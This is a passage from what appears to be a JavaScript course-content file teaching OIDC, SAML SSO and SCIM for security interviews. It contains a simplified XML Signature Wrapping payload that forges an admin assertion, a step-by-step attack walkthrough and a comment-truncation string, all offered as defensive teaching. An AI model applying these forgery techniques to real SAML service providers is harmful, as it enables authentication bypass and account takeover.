<p>Mistakes to call out: sending ID tokens to APIs as bearer tokens (wrong audience, no scopes), using access tokens as proof of login (pseudo-authentication), and keying users on email instead of <code>(iss, sub)</code>. A resource server should also check <code>typ: at+jwt</code> so an ID token cannot be substituted.</p>`
        },
        {
          q: 'Walk me through an OIDC login and what the relying party must validate.',
          a: `<ol>
<li>RP discovers the OP (<code>.well-known/openid-configuration</code>, verifies issuer), loads JWKS.</li>
<li>RP creates <code>state</code>, <code>nonce</code>, PKCE verifier; redirects to <code>/authorize</code> with <code>scope=openid ...</code>.</li>
<li>User authenticates at the OP (SSO session may already exist), consents.</li>
<li>OP redirects to the callback with <code>code</code> and <code>state</code>; RP checks state.</li>
<li>RP exchanges code + verifier (+ client auth) at <code>/token</code> &rarr; ID token, access token, refresh token.</li>
<li>RP validates the ID token: signature (JWKS, expected alg), <code>iss</code> exact, <code>aud</code> = client_id (and <code>azp</code>), <code>exp</code>/<code>iat</code>, <code>nonce</code>, <code>auth_time</code>/<code>acr</code> if required.</li>
<li>RP maps <code>(iss, sub)</code> to a local user (JIT provisioning or SCIM-created), creates a <strong>new</strong> session (rotated ID), stores the OP <code>sid</code> for logout.</li>
</ol>
<p>Then mention logout (RP-initiated + back-channel) and step-up via <code>acr_values</code>/<code>max_age</code>.</p>`
        },
        {
          q: 'How does single logout work across multiple applications with OIDC?',
          a: `<p>There are three layers: each RP's session, the OP session, and tokens issued to APIs.</p>
<ul>
<li><strong>RP-initiated logout</strong>: app deletes its session and redirects to the OP <code>end_session_endpoint</code> with <code>id_token_hint</code> and a registered <code>post_logout_redirect_uri</code>.</li>
<li>The OP ends its SSO session and notifies other RPs. <strong>Back-channel logout</strong> is the reliable mechanism: a signed logout token (with <code>sid</code>/<code>sub</code>, <code>events</code>, <code>jti</code>, no <code>nonce</code>) is POSTed server-to-server to each RP, which deletes matching sessions. Front-channel (iframes) is unreliable with third-party cookie blocking.</li>
<li><strong>Tokens</strong>: refresh tokens tied to the OP session are revoked; JWT access tokens live until expiry — keep them short or add revocation checks.</li>
</ul>
<p>Implementation needs: sessions indexed by OP <code>sid</code>, idempotent handlers, retries from the OP, and monitoring of failed logout deliveries.</p>`
        },
        {
          q: 'What are the security pitfalls of social login?',
          a: `<ul>
<li><strong>Wrong identifier</strong>: using email or username instead of <code>(iss, sub)</code> &rarr; takeover when emails are unverified, mutable or recycled (nOAuth-style).</li>
<li><strong>Automatic account linking by email</strong> &rarr; attacker-controlled provider account merges into the victim's account. Require authenticated, explicit linking.</li>
<li><strong>Pre-account takeover</strong>: attacker pre-registers the victim's email with a password; the victim later uses social login and gets merged into an account the attacker controls. Require email verification and don't silently merge.</li>
<li><strong>Multi-tenant issuers</strong>: accepting any Entra ID tenant when you meant one.</li>
<li><strong>Plain OAuth providers</strong> (no ID token): verify tokens were issued to your client (introspection / debug endpoint), or avoid.</li>
<li><strong>Over-broad scopes</strong> and storing provider tokens unnecessarily.</li>
</ul>`
        }
      ],
      quiz: [
        { q: 'Which scope turns an OAuth request into an OIDC authentication request?', a: 'openid' },
        { q: 'What is the audience of an ID token?', a: 'The client (relying party) — its client_id.' },
        { q: 'What uniquely and stably identifies a user in OIDC?', a: 'The combination of iss (issuer) and sub (subject).' },
        { q: 'Where is the OIDC discovery document located?', a: 'At {issuer}/.well-known/openid-configuration.' },
        { q: 'What does the nonce protect against?', a: 'Replay or injection of an ID token that was not issued for this specific authentication request.' },
        { q: 'Which claim must be present in a back-channel logout token\'s events, and which claim must be absent?', a: 'events must contain http://schemas.openid.net/event/backchannel-logout, and nonce must not be present.' },
        { q: 'Why is front-channel logout becoming unreliable?', a: 'It relies on iframes carrying the RP\'s cookies, which browsers increasingly block as third-party cookies.' },
        { q: 'Which parameters let an RP demand recent or stronger authentication?', a: 'max_age (checked via auth_time) and acr_values (checked via acr); prompt=login forces re-authentication.' }
      ],
      resources: [
        { title: 'OpenID Foundation — Specifications', url: 'https://openid.net/developers/specs/', type: 'docs' },
        { title: 'OpenID Connect Core 1.0', url: 'https://openid.net/specs/openid-connect-core-1_0.html', type: 'docs' },
        { title: 'OpenID Connect Back-Channel Logout 1.0', url: 'https://openid.net/specs/openid-connect-backchannel-1_0.html', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 7 ─────────────────────────────────────────────
    {
      n: 7,
      title: 'SAML & Single Sign-On',
      summary: `Enterprise SSO end to end: federation concepts, SAML 2.0 assertions, bindings and metadata, SP- vs IdP-initiated flows, the signature-validation pitfalls behind XML Signature Wrapping, how SAML compares with OIDC, and SCIM provisioning with enterprise IdPs such as Microsoft Entra ID and Okta — the core of selling B2B SaaS.`,
      topics: [
        {
          title: 'SSO and Federation Concepts',
          def: `<p><strong>Single Sign-On</strong>: the user authenticates once at an <strong>Identity Provider (IdP)</strong> and gets access to many <strong>Service Providers (SP)</strong> / relying parties without re-entering credentials. <strong>Federation</strong> extends this across organizational boundaries: your SaaS (SP) trusts a customer's IdP (Entra ID, Okta, Ping, ADFS, Google Workspace) via exchanged metadata and keys.</p>
<ul>
<li><strong>Trust establishment</strong>: out-of-band exchange of metadata — entity IDs, endpoints, and signing/encryption certificates (SAML) or issuer + client registration (OIDC).</li>
<li><strong>SSO session</strong>: lives at the IdP (cookie on the IdP domain). Each SP then creates its own local session. "SSO" works because the IdP recognizes its session and issues a new assertion without prompting.</li>
<li><strong>Protocols</strong>: SAML 2.0 (enterprise web SSO, 2005), OIDC (modern web/mobile/API), WS-Federation (legacy Microsoft), Kerberos/IWA (intranet), plus CAS and LDAP binds in older stacks.</li>
<li><strong>Brokers</strong>: an identity broker (Keycloak, Auth0, Entra External ID) federates with many upstream IdPs and presents a single OIDC interface to your apps — common pattern for B2B SaaS.</li>
</ul>
<p><strong>Security trade-offs</strong>: SSO concentrates risk — compromise of the IdP account opens everything — so enforce phishing-resistant MFA and conditional access at the IdP. It also centralizes deprovisioning: disabling the user at the IdP blocks <em>new</em> logins, but existing SP sessions and tokens remain until they expire, which is why SCIM, short sessions and back-channel logout matter.</p>
<p><strong>Home realm discovery</strong>: the SP decides which IdP to send the user to — by email domain, tenant subdomain (<code>acme.app.com</code>), or a selection page.</p>`,
          interview: 'Explain IdP vs SP, how trust is established (metadata and certificates), that the SSO session lives at the IdP while each app has its own session, and the deprovisioning gap (disabled at IdP but app session still alive).',
          examples: [
            {
              label: 'Two sessions in SSO',
              lang: 'text',
              code: `Browser cookies after SSO:
  login.idp.com      -> IdP SSO session (e.g. 12h, MFA done)
  app1.example.com   -> app1 session (created from SAML assertion)
  app2.example.net   -> app2 session (created from OIDC ID token)

User opens app3: app3 -> redirect to IdP -> IdP sees its session cookie -> issues assertion without prompting
User disabled at IdP: app1/app2 sessions remain valid until they expire or are revoked (SCIM / logout events)`
            }
          ]
        },
        {
          title: 'SAML 2.0: Assertions, Protocols, Bindings and Metadata',
          def: `<p>SAML 2.0 (OASIS) is XML-based. Four layers:</p>
<ul>
<li><strong>Assertions</strong>: signed XML statements from the IdP. <code>&lt;Subject&gt;</code> with a <code>NameID</code> (formats: persistent, transient, emailAddress, unspecified) and <code>SubjectConfirmationData</code> (<code>Recipient</code>, <code>InResponseTo</code>, <code>NotOnOrAfter</code>); <code>&lt;Conditions&gt;</code> (<code>NotBefore</code>, <code>NotOnOrAfter</code>, <code>AudienceRestriction</code> = the SP entity ID); <code>&lt;AuthnStatement&gt;</code> (time, <code>SessionIndex</code>, <code>AuthnContextClassRef</code> such as PasswordProtectedTransport or MFA); <code>&lt;AttributeStatement&gt;</code> (email, groups, roles).</li>
<li><strong>Protocols</strong>: <code>AuthnRequest</code> &rarr; <code>Response</code>, <code>LogoutRequest</code>/<code>LogoutResponse</code> (Single Logout), <code>ArtifactResolve</code>.</li>
<li><strong>Bindings</strong> (how messages travel): <strong>HTTP-Redirect</strong> (DEFLATE + base64 in the query string; signature as separate <code>SigAlg</code>/<code>Signature</code> query params; used for AuthnRequests), <strong>HTTP-POST</strong> (base64 in an auto-submitted HTML form; used for Responses because they are large), <strong>HTTP-Artifact</strong> (a reference resolved over a back channel SOAP call).</li>
<li><strong>Profiles</strong>: Web Browser SSO, Single Logout, etc.</li>
</ul>
<p><strong>Metadata</strong> (<code>EntityDescriptor</code>) describes each party: <code>entityID</code>, IdP <code>SingleSignOnService</code> endpoints, SP <code>AssertionConsumerService</code> (ACS) URL, signing and encryption certificates, NameID formats. Exchange metadata URLs where possible so certificate rollover is automatic; otherwise track certificate expiry — expired IdP signing certs are a classic SSO outage.</p>
<p>Assertions can be <strong>encrypted</strong> (<code>EncryptedAssertion</code>, using the SP's public key) to hide attributes from the browser. Signatures can be on the Response, the Assertion, or both; SPs should require a signed assertion (or signed response wrapping exactly one assertion) per their library's secure configuration.</p>`,
          interview: 'Name the key assertion elements and what each condition protects (Audience, Recipient, InResponseTo, NotOnOrAfter). Know Redirect vs POST binding and why responses use POST. Mention metadata and certificate rollover as an operational concern.',
          examples: [
            {
              label: 'Trimmed SAML assertion',
              lang: 'text',
              code: `<saml:Assertion ID="_a75adf55" IssueInstant="2026-10-29T12:00:00Z" Version="2.0">
  <saml:Issuer>https://sts.windows.net/9188040d-.../</saml:Issuer>
  <ds:Signature>... Reference URI="#_a75adf55" ...</ds:Signature>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">u-7f3c91</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData InResponseTo="_req-4c1e" NotOnOrAfter="2026-10-29T12:05:00Z"
                                    Recipient="https://app.example.com/saml/acs"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="2026-10-29T11:59:30Z" NotOnOrAfter="2026-10-29T13:00:00Z">
    <saml:AudienceRestriction><saml:Audience>https://app.example.com/saml/metadata</saml:Audience></saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="2026-10-29T11:59:58Z" SessionIndex="_sess-91">
    <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="email"><saml:AttributeValue>alice@acme.com</saml:AttributeValue></saml:Attribute>
    <saml:Attribute Name="groups"><saml:AttributeValue>app-admins</saml:AttributeValue></saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>`
            }
          ]
        },
        {
          title: 'SP-Initiated vs IdP-Initiated Flows',
          def: `<p><strong>SP-initiated SSO</strong> (preferred):</p>
<ol>
<li>User visits <code>https://app.example.com/reports</code> without a session.</li>
<li>SP creates an <code>AuthnRequest</code> (ID <code>_req-4c1e</code>, ACS URL, Issuer = SP entity ID), stores the request ID and the target URL (as an opaque <code>RelayState</code> reference), and redirects via HTTP-Redirect binding (optionally signed).</li>
<li>IdP authenticates the user (or reuses its session), applies policies (MFA, conditional access).</li>
<li>IdP returns an auto-submitting HTML form that POSTs <code>SAMLResponse</code> + <code>RelayState</code> to the SP's ACS URL.</li>
<li>SP validates the response: signature with the IdP certificate from metadata, <code>Destination</code>/<code>Recipient</code> = ACS URL, <code>Audience</code> = SP entity ID, <code>InResponseTo</code> = a pending request ID (single use), time conditions with small skew, assertion ID not replayed.</li>
<li>SP maps <code>NameID</code>/attributes to a user, creates a new local session, redirects to the stored target.</li>
</ol>
<p><strong>IdP-initiated SSO</strong>: the user clicks an app tile in the IdP portal and the IdP sends an <em>unsolicited</em> response (no <code>InResponseTo</code>). Risks:</p>
<ul>
<li>No binding to a request the SP made &rarr; <strong>login CSRF</strong> (attacker's assertion logs the victim into the attacker's account) and easier <strong>replay/injection</strong> of stolen assertions within their validity.</li>
<li><code>RelayState</code> often abused as an <strong>open redirect</strong>.</li>
</ul>
<p>Mitigations: disable IdP-initiated where possible; otherwise accept it only with short validity, a strict assertion-ID replay cache, and redirect into an SP-initiated flow ("IdP-initiated &rarr; SP-initiated bounce"). Never treat <code>RelayState</code> as a URL without allow-listing.</p>`,
          interview: 'Walk through SP-initiated SSO naming every validation, then explain why IdP-initiated is riskier (no InResponseTo -> CSRF and replay) and what you do about it.',
          examples: [
            {
              label: 'Decode SAML messages from a browser trace',
              lang: 'bash',
              code: `# HTTP-POST binding (SAMLResponse form field): plain base64
echo "$SAML_RESPONSE" | base64 -d | xmllint --format -

# HTTP-Redirect binding (SAMLRequest query param): URL-decode, base64-decode, raw-inflate
python3 -c 'import sys,zlib,base64,urllib.parse as u; d=base64.b64decode(u.unquote(sys.argv[1])); print(zlib.decompress(d,-15).decode())' "$SAML_REQUEST" | xmllint --format -

# Useful fields to check: Destination, InResponseTo, Issuer, Audience, NotOnOrAfter, NameID, Signature placement`
            }
          ]
        },
        {
          title: 'Signature Validation and XML Signature Wrapping',
          def: `<p>SAML security rests entirely on correct XML signature validation — and XML makes that hard. XML-DSig signs a referenced element (<code>Reference URI="#id"</code>) after canonicalization; the rest of the document is not covered.</p>
<p><strong>XML Signature Wrapping (XSW)</strong>: the attacker keeps the original signed assertion (so the signature still verifies) but moves it somewhere harmless (e.g. inside an <code>Extensions</code> element) and inserts a forged, unsigned assertion where the application's business logic looks. The signature module validates element A; the app reads element B.</p>
<p>Related attack classes:</p>
<ul>
<li><strong>Comment / text-node truncation</strong> (2018): <code>user@evil.com&lt;!----&gt;.example.com</code> — signature covers the full text, but some libraries return only the first text node.</li>
<li><strong>Parser differentials</strong>: two XML parsers (one for signature, one for data) disagree about the document — the root cause of 2024–2025 critical bypasses in popular SAML libraries (e.g. ruby-saml).</li>
<li><strong>Trusting KeyInfo</strong>: verifying with the certificate embedded in the message instead of the IdP certificate from metadata &rarr; anyone can self-sign.</li>
<li><strong>Unsigned elements</strong> accepted (signature optional), signature stripping, <strong>XXE</strong> and entity-expansion DoS in the XML parser.</li>
</ul>
<p><strong>Defenses</strong>:</p>
<ol>
<li>Use a maintained, well-reviewed SAML library; patch promptly; never hand-roll validation.</li>
<li>Pin the IdP signing certificate(s) from metadata; ignore embedded <code>KeyInfo</code> for trust.</li>
<li>Require signatures; reject documents with more than one assertion; use <em>only</em> the element returned by the signature verifier ("what is verified is what is used").</li>
<li>Schema-validate; disable DTDs and external entities.</li>
<li>Check Destination, Recipient, Audience, InResponseTo, NotBefore/NotOnOrAfter; keep an assertion-ID replay cache.</li>
<li>Fuzz and test with known XSW payloads (e.g. SAML Raider) in CI.</li>
</ol>`,
          interview: 'Explain XSW concretely (signed element moved, forged element read), and the principle that the application must consume exactly the element whose signature was verified. Mention pinning the IdP certificate and parser-differential bugs as a recurring real-world class.',
          examples: [
            {
              label: 'XSW shape (simplified)',
              lang: 'text',
              code: `<samlp:Response>
  <saml:Assertion ID="_evil">                        <- forged, UNSIGNED; app code reads the first Assertion
    <saml:Subject><saml:NameID>admin@victim.com</saml:NameID></saml:Subject>
  </saml:Assertion>
  <samlp:Extensions>
    <saml:Assertion ID="_a75adf55">                  <- original, validly signed (attacker's own login)
      <ds:Signature> Reference URI="#_a75adf55" </ds:Signature>
      <saml:Subject><saml:NameID>attacker@victim.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </samlp:Extensions>
</samlp:Response>
Signature check: "found a valid signature over #_a75adf55" -> OK
Business logic: "first Assertion's NameID" -> admin@victim.com   => authentication bypass`
            }
          ]
        },
        {
          title: 'SAML vs OIDC',
          def: `<table>
<thead><tr><th>Aspect</th><th>SAML 2.0</th><th>OpenID Connect</th></tr></thead>
<tbody>
<tr><td>Year / body</td><td>2005, OASIS</td><td>2014, OpenID Foundation (on OAuth 2.0)</td></tr>
<tr><td>Format</td><td>XML assertions, XML-DSig</td><td>JSON, JWT (JWS/JWE)</td></tr>
<tr><td>Transport</td><td>browser POST/redirect bindings</td><td>redirects + back-channel REST token endpoint</td></tr>
<tr><td>Clients</td><td>browser-based web apps</td><td>web, SPA, mobile, CLI, devices, APIs</td></tr>
<tr><td>API access</td><td>not designed for it</td><td>built on OAuth access tokens</td></tr>
<tr><td>Discovery / keys</td><td>metadata XML, manual cert rollover common</td><td>.well-known discovery, JWKS rotation</td></tr>
<tr><td>Logout</td><td>SLO (front/back channel), fragile</td><td>RP-initiated, back-channel logout</td></tr>
<tr><td>Security pitfalls</td><td>XSW, canonicalization, XXE, parser differentials</td><td>JWT validation errors, redirect URI, token storage</td></tr>
<tr><td>Enterprise adoption</td><td>ubiquitous in enterprise IdPs and legacy apps</td><td>supported by all modern IdPs; default for new builds</td></tr>
<tr><td>Developer experience</td><td>heavy, XML tooling</td><td>simple JSON/HTTP, great libraries</td></tr>
</tbody>
</table>
<p><strong>When to use which</strong>: new applications and anything mobile/API-centric &rarr; OIDC. B2B SaaS selling to enterprises &rarr; support <strong>both</strong> (many customers' IT teams still standardize on SAML), usually via an identity broker that speaks SAML to customer IdPs and OIDC to your own services, so your app code handles only one protocol.</p>`,
          interview: 'Give a structured comparison (format, clients, API support, discovery, logout, security pitfalls) and a pragmatic recommendation: OIDC for new builds, SAML support for enterprise customers via a broker so services only speak OIDC.',
          examples: [
            {
              label: 'Broker pattern for B2B SaaS',
              lang: 'text',
              code: `Customer A (Okta, SAML) ----\\
Customer B (Entra ID, OIDC) --+--> Identity broker (Keycloak / Auth0 / Entra External ID) --OIDC--> your BFF/apps
Customer C (Google, OIDC) ---/        - per-tenant IdP config, attribute mapping
                                      - normalizes claims: sub, tenant_id, email, groups
                                      - issues YOUR tokens with your iss/aud`
            }
          ]
        },
        {
          title: 'SCIM Provisioning and Enterprise IdPs (Entra ID, Okta)',
          def: `<p>SSO answers "can this person log in?"; <strong>provisioning</strong> answers "which accounts should exist, with which groups, and when must they be removed?". <strong>SCIM 2.0</strong> (RFC 7643 schema, RFC 7644 protocol) is the standard REST API an IdP calls on your app:</p>
<ul>
<li><code>POST /scim/v2/Users</code> (create), <code>GET /Users?filter=userName eq "alice@acme.com"</code>, <code>PATCH /Users/{id}</code> (update, e.g. <code>active: false</code>), <code>DELETE /Users/{id}</code>, and the same for <code>/Groups</code> with member PATCH operations.</li>
<li>Authenticated with a per-tenant bearer token (or OAuth client credentials); content type <code>application/scim+json</code>.</li>
<li>Joiner-Mover-Leaver lifecycle: new hire &rarr; account + groups before day one; role change &rarr; group membership updates; leaver &rarr; <code>active=false</code> &rarr; your app must <strong>disable the account, kill sessions and revoke tokens/API keys</strong> immediately.</li>
</ul>
<p><strong>JIT provisioning</strong> (create users on first SSO login from assertion attributes) is simpler but can't deprovision — leavers keep dormant accounts and API keys. Enterprise customers expect SCIM.</p>
<p><strong>Microsoft Entra ID</strong> (formerly Azure AD): "Enterprise applications" for SAML/OIDC SSO and SCIM provisioning; app registrations for OAuth; Conditional Access policies (MFA, device compliance, location); group claims can hit an "overage" limit (claim replaced by a Graph API pointer for users in many groups) — use app roles or group filtering. Its SCIM client has quirks (e.g. sending <code>"Replace"</code> ops and string booleans) to handle leniently.</p>
<p><strong>Okta</strong>: app integrations (SAML/OIDC), SCIM provisioning with push groups, Okta Integration Network listing for SaaS vendors, adaptive MFA and FastPass (phishing-resistant).</p>`,
          interview: 'Explain why SSO alone is not enough (deprovisioning), the SCIM endpoints and lifecycle, JIT vs SCIM trade-offs, and what your app must do when active=false arrives. Mentioning Entra group overage or SCIM quirks signals real experience.',
          examples: [
            {
              label: 'SCIM deprovisioning request from the IdP',
              lang: 'http',
              code: `PATCH /scim/v2/Users/2819c223-7f76-453a-919d-413861904646 HTTP/1.1
Host: app.example.com
Authorization: Bearer scim_tenant_acme_...
Content-Type: application/scim+json

{
  "schemas": ["urn:ietf:params:scim:api:messages:2.0:PatchOp"],
  "Operations": [ { "op": "replace", "path": "active", "value": false } ]
}

HTTP/1.1 200 OK
Content-Type: application/scim+json

{ "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
  "id": "2819c223-7f76-453a-919d-413861904646", "userName": "alice@acme.com", "active": false }`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Decode a SAML Response captured from the browser',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>Capture the POST to the ACS URL in devtools (or a SAML tracer extension).</li><li>URL-decode then base64-decode the <code>SAMLResponse</code>; pretty print with <code>xmllint</code>.</li><li>Identify Issuer, Destination, InResponseTo, Audience, NotOnOrAfter, NameID and where the Signature is.</li></ul>`,
          solution: `# saml.txt contains the URL-encoded SAMLResponse form value
python3 -c 'import sys,urllib.parse as u;print(u.unquote(sys.stdin.read().strip()))' < saml.txt \\
  | base64 -d > response.xml
xmllint --format response.xml | less

# Quick field extraction
xmllint --xpath 'string(//*[local-name()="Response"]/@Destination)' response.xml; echo
xmllint --xpath 'string(//*[local-name()="SubjectConfirmationData"]/@InResponseTo)' response.xml; echo
xmllint --xpath 'string(//*[local-name()="Audience"])' response.xml; echo
xmllint --xpath 'string(//*[local-name()="NameID"])' response.xml; echo
# Is the Signature a child of Response, Assertion, or both?
xmllint --xpath 'name(//*[local-name()="Signature"]/..)' response.xml; echo

# Inspect the IdP signing certificate embedded in the message (for comparison with metadata only!)
xmllint --xpath 'string(//*[local-name()="X509Certificate"])' response.xml | base64 -d | openssl x509 -inform DER -noout -subject -enddate`,
          lang: 'bash'
        },
        {
          t: 'Produce SP metadata and onboard to an IdP',
          d: 'easy',
          type: 'hands-on',
          hint: `<ul><li>SP metadata contains entityID, ACS URL (HTTP-POST), optional SLO URL, signing/encryption certificate, NameID format.</li><li>Import IdP metadata by URL so its certificates roll automatically.</li><li>Agree on attributes: email, given/family name, groups or app roles.</li></ul>`,
          solution: `<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
    entityID="https://app.example.com/saml/metadata">
  <md:SPSSODescriptor AuthnRequestsSigned="true" WantAssertionsSigned="true"
      protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <md:KeyDescriptor use="signing"><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:X509Data><ds:X509Certificate>MIIC...</ds:X509Certificate></ds:X509Data></ds:KeyInfo></md:KeyDescriptor>
    <md:NameIDFormat>urn:oasis:names:tc:SAML:2.0:nameid-format:persistent</md:NameIDFormat>
    <md:AssertionConsumerService index="0" isDefault="true"
        Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
        Location="https://app.example.com/saml/acs"/>
  </md:SPSSODescriptor>
</md:EntityDescriptor>

Onboarding checklist for the customer's IdP admin:
- Entity ID / Audience: https://app.example.com/saml/metadata
- ACS URL: https://app.example.com/saml/acs   (per-tenant ACS if multi-tenant: /saml/acs/{tenant})
- NameID: persistent, immutable user id (not email)
- Attributes: email, givenName, surname, groups (filtered to app groups)
- Provide IdP metadata URL; we monitor its signing certificate expiry.`,
          lang: 'text'
        },
        {
          t: 'List every check an SP must perform on a SAML Response',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>Group into: XML parsing hygiene, signature, message binding, assertion conditions, replay, mapping.</li><li>For each, name the attack it prevents.</li></ul>`,
          solution: `Parsing
 1. Disable DTD/external entities, limit size and depth                -> XXE, billion laughs
 2. Schema-validate; reject multiple Assertions / unexpected structure  -> XSW
Signature
 3. Signature required on Assertion (or on Response containing exactly one Assertion) -> forged assertions
 4. Verify with IdP cert(s) from metadata, ignore message KeyInfo for trust          -> self-signed forgeries
 5. Allowed algorithms only (RSA-SHA256+, no SHA-1), exc-c14n                        -> weak crypto
 6. Use ONLY the element covered by the verified signature                            -> XSW, comment truncation
Binding
 7. Response Destination == our ACS URL; Issuer == expected IdP entityID              -> response redirection, mix-up
 8. InResponseTo == a pending AuthnRequest ID for this browser session (single use)    -> login CSRF, injection
Conditions
 9. Audience == our SP entityID                                                         -> assertion for another SP
10. SubjectConfirmation Method=bearer, Recipient == ACS, NotOnOrAfter in future         -> replay elsewhere / later
11. Conditions NotBefore/NotOnOrAfter with <= 60-120s skew                              -> stale assertions
Replay
12. Cache assertion IDs until NotOnOrAfter; reject duplicates                           -> replay
Mapping
13. Map persistent NameID (scoped to IdP + tenant) to user; authorize via groups/roles     -> account confusion
14. Create a NEW session id; validate RelayState against allow-list                       -> fixation, open redirect`,
          lang: 'text'
        },
        {
          t: 'Add SAML SSO to a Go service with crewjam/saml',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li><code>samlsp.FetchMetadata</code> for the IdP metadata URL; SP key pair from your secret store.</li><li><code>samlsp.New(samlsp.Options{...})</code> returns a middleware serving <code>/saml/metadata</code> and <code>/saml/acs</code>.</li><li>Wrap protected routes with <code>RequireAccount</code>; read attributes with <code>samlsp.AttributeFromContext</code>.</li><li>Keep IdP-initiated disabled; pin the library version and watch its advisories.</li></ul>`,
          solution: `func newSAML(ctx context.Context) (*samlsp.Middleware, error) {
    kp, err := tls.LoadX509KeyPair("/secrets/sp.crt", "/secrets/sp.key")
    if err != nil {
        return nil, err
    }
    kp.Leaf, err = x509.ParseCertificate(kp.Certificate[0])
    if err != nil {
        return nil, err
    }
    mdURL, _ := url.Parse("https://login.microsoftonline.com/<tenant-id>/federationmetadata/2007-06/federationmetadata.xml?appid=<app-id>")
    idpMD, err := samlsp.FetchMetadata(ctx, http.DefaultClient, *mdURL)
    if err != nil {
        return nil, err
    }
    root, _ := url.Parse("https://app.example.com")
    return samlsp.New(samlsp.Options{
        URL:               *root,                       // ACS = /saml/acs, metadata = /saml/metadata
        Key:               kp.PrivateKey.(*rsa.PrivateKey),
        Certificate:       kp.Leaf,
        IDPMetadata:       idpMD,
        SignRequest:       true,
        AllowIDPInitiated: false,                       // keep InResponseTo binding
    })
}

func main() {
    sp, err := newSAML(context.Background())
    if err != nil {
        log.Fatal(err)
    }
    mux := http.NewServeMux()
    mux.Handle("/saml/", sp)
    mux.Handle("GET /reports", sp.RequireAccount(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        email := samlsp.AttributeFromContext(r.Context(), "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress")
        fmt.Fprintf(w, "hello %s", email)
    })))
    log.Fatal(http.ListenAndServeTLS(":8443", "tls.crt", "tls.key", mux))
}`,
          lang: 'go'
        },
        {
          t: 'Explain an XML Signature Wrapping attack and how to prevent it',
          d: 'medium',
          type: 'concept',
          hint: `<ul><li>Two components look at the document differently: the signature verifier and the business logic.</li><li>The attacker needs one legitimately signed assertion (e.g. from their own account).</li><li>Fix: consume only the verified element, strict schema, single assertion, maintained library.</li></ul>`,
          solution: `1. Attacker (a legitimate user at the IdP) obtains a signed Response for attacker@victim.com.
2. Edits the XML: wraps the signed Assertion inside <Extensions> (or an Object element) and inserts a forged
   Assertion with NameID admin@victim.com at the position the SP's code reads (e.g. Response/Assertion[1]).
3. The signature verifier locates the element with ID="_a75adf55" via the Reference URI and verifies it: valid.
4. The SP's mapping code uses XPath "/Response/Assertion" -> the forged, unsigned one -> logs in as admin.

Prevention:
- Library returns the verified element; application only reads from that object (no second parse / XPath on raw XML).
- Reject responses with more than one Assertion or with Assertions in unexpected places (schema validation).
- Require signatures and pin IdP certificates from metadata.
- Keep the SAML library patched (multiple 2024-2025 CVEs were parser-differential bypasses).
- Regression tests using XSW variants (SAML Raider / known test corpora).`,
          lang: 'text'
        },
        {
          t: 'Debug a SAML SSO outage after an IdP change',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Typical causes: IdP signing certificate rotated (metadata not refreshed), clock skew, audience/entityID mismatch after a config change, ACS URL behind a proxy (http vs https), NameID format change.</li><li>Read the library error and decode the response.</li></ul>`,
          solution: `Error: "cannot validate signature on Response: x509: certificate signed by unknown authority / key mismatch"
  -> IdP rolled its signing cert; SP pinned the old one. Fix: consume IdP metadata URL with periodic refresh;
     during rollover trust both certs; alert 30 days before IdP cert expiry.

Error: "Audience restriction not satisfied: expected https://app.example.com/saml/metadata"
  -> IdP app config uses another Identifier (e.g. "spn:..." or a staging entity ID). Fix the IdP config, never
     relax audience validation.

Error: "Destination mismatch: http://app.example.com/saml/acs"
  -> TLS terminated at the load balancer; app builds ACS URL from the internal scheme. Fix: configure the
     external base URL explicitly.

Error: "assertion expired" only on some pods
  -> node clock drift. Fix NTP; allowed skew <= 2 min.

Users duplicated after migration
  -> NameID format changed from persistent to emailAddress. Fix: map on a stable immutable attribute
     (e.g. Entra objectId) and migrate links.`,
          lang: 'text'
        },
        {
          t: 'Implement SCIM 2.0 user deactivation in Go',
          d: 'hard',
          type: 'coding',
          hint: `<ul><li>Authenticate the per-tenant SCIM bearer token (hashed at rest) and scope all queries by tenant.</li><li>Parse PatchOp leniently: case-insensitive <code>op</code>, boolean or string values, path or value-object forms.</li><li>On <code>active=false</code>: disable the user, delete sessions, revoke refresh tokens and API keys, audit log.</li></ul>`,
          solution: `type patchOp struct {
    Schemas    []string \`json:"schemas"\`
    Operations []struct {
        Op    string          \`json:"op"\`
        Path  string          \`json:"path"\`
        Value json.RawMessage \`json:"value"\`
    } \`json:"Operations"\`
}

func parseBool(raw json.RawMessage) (bool, bool) {
    var b bool
    if json.Unmarshal(raw, &b) == nil {
        return b, true
    }
    var s string
    if json.Unmarshal(raw, &s) == nil { // some IdPs send "False"
        if v, err := strconv.ParseBool(strings.ToLower(s)); err == nil {
            return v, true
        }
    }
    var obj map[string]json.RawMessage // {"op":"replace","value":{"active":false}}
    if json.Unmarshal(raw, &obj) == nil {
        if a, ok := obj["active"]; ok {
            return parseBool(a)
        }
    }
    return false, false
}

func (h *SCIM) PatchUser(w http.ResponseWriter, r *http.Request) {
    tenant, ok := h.authTenant(r) // constant-time compare of SHA-256(bearer) with stored hash
    if !ok {
        scimError(w, http.StatusUnauthorized, "invalid token")
        return
    }
    var p patchOp
